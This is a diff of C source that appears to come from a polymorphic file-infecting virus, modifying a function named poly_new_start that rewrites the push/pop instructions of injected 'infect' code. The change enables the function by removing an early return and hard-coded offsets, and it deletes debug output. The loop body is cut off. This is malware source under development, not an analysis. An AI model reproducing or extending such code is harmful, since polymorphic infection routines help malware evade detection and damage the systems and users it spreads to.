@@ -39,18 +39,13 @@
  * 
  */
 
-extern void _infect_push(void);
-extern void _infect_pop(void);
-
 # define NB_POP 7
 # define MAX 7
 
-void poly_new_start(void *start)
+void poly_new_start(void *start, size_t push_off, size_t pop_off)
 {
-	return ;
-	char *start_push = start + 1;
-	//char *start_pop = ((size_t)&_infect_pop - (size_t)&_infect_push) + start;
-	char *start_pop = ((size_t)0x3851 - (size_t)0x101) + (size_t)start - 4;
+	char *start_push = start + push_off;
+	char *start_pop = start + pop_off;
 
 	size_t i;
 	size_t i_pop = NB_POP;
@@ -62,32 +57,8 @@ void poly_new_start(void *start)
 
 	debug_ext("edit start ", start_push, " to ", start_pop, "\n");
 
-	debug_ext("instruction at start push ", (unsigned char)(start_push[-1]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-13]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-12]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-11]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-10]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-9]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-8]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-7]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-6]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-5]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-4]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-3]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-2]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[-1]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[0]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[1]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[2]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[3]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[4]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[5]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[6]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[7]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[8]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[9]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[10]), "\n");
-	debug_ext("instruction at start pop ", (unsigned char)(start_pop[11]), "\n");
+	//debug_ext("instruction at start push ", (unsigned char)(start_push[-1]), "\n");
+	//debug_ext("instruction at start pop ", (unsigned char)(start_pop[-1]), "\n");
 
 	while (1)
 	{
